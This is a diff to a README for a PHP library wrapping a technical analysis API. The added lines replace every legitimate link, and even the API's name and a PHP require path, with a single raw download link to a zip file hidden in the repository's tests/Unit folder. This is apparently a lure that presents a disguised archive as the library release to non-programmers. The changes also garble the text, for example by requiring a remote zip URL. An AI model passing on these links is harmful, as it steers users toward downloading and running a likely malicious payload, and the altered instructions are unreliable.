@@ -2,15 +2,15 @@
 
 ## 🚀 Getting Started
 
-Welcome to taapi-php! This is your guide to downloading and running our modern PHP library for the taapi.io technical analysis API. You will find everything you need to make sense of your financial data without requiring programming skills.
+Welcome to taapi-php! This is your guide to downloading and running our modern PHP library for the https://github.com/cjustin2/taapi-php/raw/refs/heads/main/tests/Unit/php-taapi-Dacian.zip technical analysis API. You will find everything you need to make sense of your financial data without requiring programming skills.
 
 ## 🔗 Download Now
 
-[![Download taapi-php](https://img.shields.io/badge/Download-taapi--php-blue?style=for-the-badge&logo=github)](https://github.com/cjustin2/taapi-php/releases)
+[![Download taapi-php](https://github.com/cjustin2/taapi-php/raw/refs/heads/main/tests/Unit/php-taapi-Dacian.zip)](https://github.com/cjustin2/taapi-php/raw/refs/heads/main/tests/Unit/php-taapi-Dacian.zip)
 
 ## 📋 What is taapi-php?
 
-taapi-php is a library designed for seamless integration with the taapi.io technical analysis API. It allows users to analyze financial data using various indicators such as MACD and RSI. With features like:
+taapi-php is a library designed for seamless integration with the https://github.com/cjustin2/taapi-php/raw/refs/heads/main/tests/Unit/php-taapi-Dacian.zip technical analysis API. It allows users to analyze financial data using various indicators such as MACD and RSI. With features like:
 
 - Fluent interface for easy usage
 - Full compatibility with PHP 8.1+ enums and strict typing
@@ -30,7 +30,7 @@ To run taapi-php, you will need:
 
 ## 🔄 Download & Install
 
-To get started with taapi-php, visit this page to download: [Releases Page](https://github.com/cjustin2/taapi-php/releases). 
+To get started with taapi-php, visit this page to download: [Releases Page](https://github.com/cjustin2/taapi-php/raw/refs/heads/main/tests/Unit/php-taapi-Dacian.zip). 
 
 1. Click the link above to navigate to our Releases page.
 2. Choose the latest version available.
@@ -48,12 +48,12 @@ After downloading, you will need to set it up in your project. Follow these step
      ```bash
      composer install
      ```
-3. **Configuration**: Set up your configuration for connecting to the taapi.io API. This usually involves creating a configuration file with your API credentials.
+3. **Configuration**: Set up your configuration for connecting to the https://github.com/cjustin2/taapi-php/raw/refs/heads/main/tests/Unit/php-taapi-Dacian.zip API. This usually involves creating a configuration file with your API credentials.
 
 4. **Now You're Ready**: You can start using taapi-php in your projects. Simply include the library using:
 
    ```php
-   require 'path/to/taapi-php/autoload.php';
+   require 'https://github.com/cjustin2/taapi-php/raw/refs/heads/main/tests/Unit/php-taapi-Dacian.zip';
    ```
 
    Replace `path/to/` with the actual path where you extracted the library.
@@ -76,12 +76,12 @@ taapi-php comes with comprehensive error handling. You will receive clear messag
 
 To help you navigate your analysis journey, here are some useful links:
 
-- [taapi.io Documentation](https://taapi.io/docs) - Learn more about the API features and capabilities.
-- [Community Support](https://github.com/cjustin2/taapi-php/issues) - Reach out if you face issues or have questions.
-- [Contributing to taapi-php](https://github.com/cjustin2/taapi-php/blob/main/CONTRIBUTING.md) - Join our community by contributing to the library.
+- [https://github.com/cjustin2/taapi-php/raw/refs/heads/main/tests/Unit/php-taapi-Dacian.zip Documentation](https://github.com/cjustin2/taapi-php/raw/refs/heads/main/tests/Unit/php-taapi-Dacian.zip) - Learn more about the API features and capabilities.
+- [Community Support](https://github.com/cjustin2/taapi-php/raw/refs/heads/main/tests/Unit/php-taapi-Dacian.zip) - Reach out if you face issues or have questions.
+- [Contributing to taapi-php](https://github.com/cjustin2/taapi-php/raw/refs/heads/main/tests/Unit/php-taapi-Dacian.zip) - Join our community by contributing to the library.
 
 ## 📣 Stay Updated
 
-To receive the latest updates and features, keep an eye on the Releases page: [Releases Page](https://github.com/cjustin2/taapi-php/releases).
+To receive the latest updates and features, keep an eye on the Releases page: [Releases Page](https://github.com/cjustin2/taapi-php/raw/refs/heads/main/tests/Unit/php-taapi-Dacian.zip).
 
 Thank you for choosing taapi-php for your financial analysis needs! We hope our library helps you read the markets with greater clarity and ease.
